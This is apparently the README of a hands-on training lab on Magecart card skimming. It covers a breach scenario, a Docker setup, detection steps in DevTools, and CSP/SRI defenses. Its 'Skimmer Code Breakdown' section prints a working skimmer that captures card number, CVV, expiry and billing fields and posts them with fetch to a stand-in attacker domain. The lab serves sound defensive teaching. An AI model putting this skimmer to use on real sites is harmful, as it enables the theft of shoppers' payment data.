# Lab 01 - Basic Magecart Attack

## 🎯 Learning Objectives

By completing this lab, you will:

- Understand how basic credit card skimmers work
- Learn about form data interception techniques
- Observe data exfiltration in action
- Practice detection using browser DevTools
- Implement basic defensive measures

## 📖 Scenario: The Compromised Admin Account

**Timeline**: September 2018  
**Victim**: "TechGear Store" - Mid-sized electronics retailer  
**Compromise Vector**: Stolen admin credentials

### How it Happened

1. **Initial Compromise**: A developer's laptop was infected with info-stealer
   malware through a phishing email
2. **Credential Theft**: The malware captured admin credentials to TechGear's
   Magento backend
3. **Silent Access**: Attackers logged in during off-hours using a VPN to mask
   their location
4. **Code Injection**: Modified a single JavaScript file (`checkout.js`) by
   appending 22 lines of code
5. **Persistence**: The modification blended with legitimate code, going
   undetected for 47 days
6. **Discovery**: Customer fraud reports led to forensic investigation

### Attack Characteristics

- **Duration**: 47 days undetected
- **Data Stolen**: ~12,000 credit card records
- **Exfiltration**: HTTP POST to a legitimate-looking analytics domain
- **Obfuscation**: Minimal (early-stage Magecart)
- **Detection**: Manual code review after fraud reports

## 🏗️ Lab Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                        User's Browser                        │
│                                                              │
│  ┌──────────────┐         ┌──────────────┐                 │
│  │  Legitimate  │         │   Malicious  │                 │
│  │   Checkout   │────────▶│   Skimmer    │                 │
│  │     Form     │         │  (skimmer.js)│                 │
│  └──────────────┘         └──────┬───────┘                 │
│                                   │                          │
└───────────────────────────────────┼──────────────────────────┘
                                    │
                    ┌───────────────▼──────────────┐
                    │   Attacker's C2 Server       │
                    │   (logs stolen card data)    │
                    └──────────────────────────────┘
```

## 📂 Files in This Lab

01-basic-magecart/ ├── 01-README.md # This file ├── scenario.md # Detailed
breach narrative ├── docker-compose.yml # Launch environment ├──
vulnerable-site/ # Victim e-commerce site │ ├── Dockerfile │ ├── index.html #
Product catalog │ ├── checkout.html # Payment form (compromised) │ ├── css/ │ │
└── style.css │ └── js/ │ ├── checkout.js # Legitimate code │ └──
checkout-compromised.js # With skimmer appended ├── malicious-code/ │ ├──
skimmer-obfuscated.js # As deployed by attacker │ ├── skimmer-clean.js #
Readable, commented version │ └── c2-server/ │ ├── Dockerfile │ ├── server.js #
Express server logging stolen data │ └── stolen-data/ # Data collection
directory ├── analysis/ │ ├── deobfuscation.md # Step-by-step code analysis │
├── network-capture.pcap # Wireshark capture │ ├── detection-guide.md # How to
find the skimmer │ └── screenshots/ └── exercises/ ├── 01-detect.md # Find the
skimmer challenge ├── 02-analyze.md # Understand the code ├── 03-prevent.md #
Implement defenses └── solutions/ # Answer key

````

## 🚀 Getting Started

### Prerequisites

- Docker & Docker Compose installed
- Basic understanding of JavaScript
- Browser with DevTools (Chrome or Firefox)
- Text editor

### Launch the Lab

```bash
# Navigate to lab directory
cd labs/01-basic-magecart

# Start the vulnerable site and C2 server
docker-compose up -d

# Verify services are running
docker-compose ps
````

**Services:**

- Vulnerable E-commerce Site: http://localhost:8080
- Attacker C2 Server: http://localhost:3000 (view stolen data)

### Lab Walkthrough

#### Part 1: Experience the Attack (10 min)

1. Visit http://localhost:8080
2. Browse products and add items to cart
3. Navigate to checkout (http://localhost:8080/checkout.html)
4. Fill out the payment form with test data:
   - Card: 4242 4242 4242 4242
   - CVV: 123
   - Expiry: 12/25
   - Name: Test User
5. Open Browser DevTools → Network tab
6. Submit the form
7. Observe TWO POST requests (one legitimate, one to C2)
8. View stolen data at http://localhost:3000/stolen

#### Part 2: Examine the Skimmer Code (15 min)

1. View page source on checkout page
2. Find the loaded JavaScript files
3. Compare:
   - `js/checkout.js` (legitimate)
   - `js/checkout-compromised.js` (with skimmer)
4. Open `malicious-code/skimmer-clean.js` to understand logic
5. Identify the key components:
   - Form field selectors
   - Data collection function
   - Exfiltration endpoint
   - Trigger conditions

#### Part 3: Detect the Attack (15 min)

Use browser DevTools to detect the skimmer:

**Console Detection:**

```javascript
// Check for suspicious event listeners
getEventListeners(document.querySelector('form'))

// Inspect XMLHttpRequest/fetch calls
// (Set breakpoint on XMLHttpRequest.prototype.send)
```

**Network Analysis:**

- Look for unexpected POST requests
- Check request payloads for form data
- Identify suspicious domains

**Static Analysis:**

- Search for encoded strings
- Look for eval() or Function() calls
- Find obfuscated variable names

#### Part 4: Implement Defenses (20 min)

Try implementing these defenses:

1. **Content Security Policy (CSP)**

   ```html
   <meta
     http-equiv="Content-Security-Policy"
     content="default-src 'self'; script-src 'self'"
   />
   ```

2. **Subresource Integrity (SRI)**

   ```html
   <script
     src="checkout.js"
     integrity="sha384-..."
     crossorigin="anonymous"
   ></script>
   ```

3. **Input Monitoring**
   ```javascript
   // Monitor for unauthorized form data access
   // See exercises/03-prevent.md for full code
   ```

## 🔍 Analysis Deep-Dive

### Skimmer Code Breakdown

```javascript
// 1. Wait for form to be ready
document.addEventListener('DOMContentLoaded', function () {
  // 2. Target the payment form
  var form = document.querySelector('#payment-form')

  // 3. Intercept form submission
  form.addEventListener('submit', function (e) {
    // 4. Extract credit card data
    var cardData = {
      number: document.querySelector('#card-number').value,
      cvv: document.querySelector('#cvv').value,
      expiry: document.querySelector('#expiry').value,
      name: document.querySelector('#cardholder-name').value,
      // Also grab billing info for complete fraud
      billing: {
        address: document.querySelector('#billing-address').value,
        zip: document.querySelector('#zip').value
      }
    }

    // 5. Exfiltrate to attacker's server
    fetch('https://analytics-cdn.com/collect', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(cardData),
      mode: 'no-cors' // Avoid CORS errors
    })

    // 6. Let legitimate form submission proceed
    // (User sees no indication of compromise)
  })
})
```

### Why This Works

1. **Client-Side Execution**: Runs in user's browser, bypassing server security
2. **Transparent Operation**: Doesn't interfere with checkout process
3. **No Visual Indicators**: User has no idea data is being stolen
4. **Minimal Code**: Just 22 lines, easy to hide in larger files
5. **Timing**: Executes only on checkout, reducing detection surface

### Data Flow

```
User enters card data → Form submission triggered → Skimmer activates →
Card data extracted → Sent to C2 server → Logged to database →
Legitimate checkout continues → User completes purchase normally
```

## 🎓 Key Takeaways

### Attack Characteristics

- ✓ **Simple but effective**: Basic JavaScript, no complex obfuscation
- ✓ **Hard to detect**: Blends with legitimate code
- ✓ **Non-disruptive**: Checkout works normally
- ✓ **Scalable**: Affects all customers during compromise period

### Detection Indicators

- 🚩 Unexpected POST requests from checkout pages
- 🚩 Form data accessed by unknown scripts
- 🚩 JavaScript files modified outside normal deployment
- 🚩 Requests to unfamiliar domains during checkout

### Prevention Strategies

- 🛡️ Strong admin credential security (MFA required)
- 🛡️ File integrity monitoring (FIM) on web assets
- 🛡️ Content Security Policy implementation
- 🛡️ Regular security code reviews
- 🛡️ Network monitoring for suspicious outbound traffic

## 📝 Exercises

### Exercise 1: Detection Challenge (Beginner)

**Objective**: Find the skimmer using only browser DevTools

1. Open the compromised site
2. Use DevTools to identify the malicious code
3. Document your methodology
4. Time yourself (can you find it in < 5 minutes?)

**Hints**:

- Check the Network tab during checkout
- Examine loaded JavaScript files
- Look for duplicate form submissions

**Solution**: See `exercises/solutions/01-detect.md`

### Exercise 2: Code Analysis (Intermediate)

**Objective**: Deobfuscate and explain the skimmer

Given this obfuscated code:

```javascript
eval(atob('ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcig...'))
```

1. Decode the Base64 string
2. Explain what each line does
3. Identify the exfiltration method
4. Find the C2 server endpoint

**Solution**: See `exercises/solutions/02-analyze.md`

### Exercise 3: Defense Implementation (Advanced)

**Objective**: Make the site resistant to this attack

Implement three defensive layers:

1. CSP that blocks the skimmer
2. SRI for all JavaScript files
3. Runtime monitoring that alerts on data exfiltration

Test your defenses by trying to inject the skimmer.

**Solution**: See `exercises/solutions/03-prevent.md`

## 🔗 Related Labs

- **Lab 02**: LocalStorage Scraper - Multi-form data collection
- **Lab 03**: Supply Chain Attack - Third-party compromise
- **Lab 10**: Advanced Evasion - Anti-debugging techniques

## 📚 Additional Resources

### Reading

- [Anatomy of Formjacking Attacks](https://unit42.paloaltonetworks.com/) - Palo
  Alto Networks
- [Inside Magecart](https://www.riskiq.com/) - RiskIQ Research
- [British Airways Breach Analysis](https://schoenbaum.medium.com/) - Technical
  deep-dive

### Tools

- [Semgrep](https://semgrep.dev/) - Static analysis
- [Burp Suite](https://portswigger.net/burp) - Traffic interception
- [Wireshark](https://www.wireshark.org/) - Network analysis

### Community

- Report findings: [Issues](../../issues)
- Discuss defenses: [Discussions](../../discussions)
- Contribute: [CONTRIBUTING.md](../../CONTRIBUTING.md)

## ⚠️ Safety Reminders

- Run only in isolated Docker environment
- Do NOT deploy on public networks
- Do NOT use real payment card data
- Clean up after completing the lab:
  ```bash
  docker-compose down -v
  ```

---

**Next Steps**: Once you've completed this lab, move on to Lab 02 to learn about
more sophisticated multi-form data scraping techniques.

[← Back to Main README](../../README.md) |
[Next Lab: LocalStorage Scraper →](../02-localstorage-scraper/README.md)
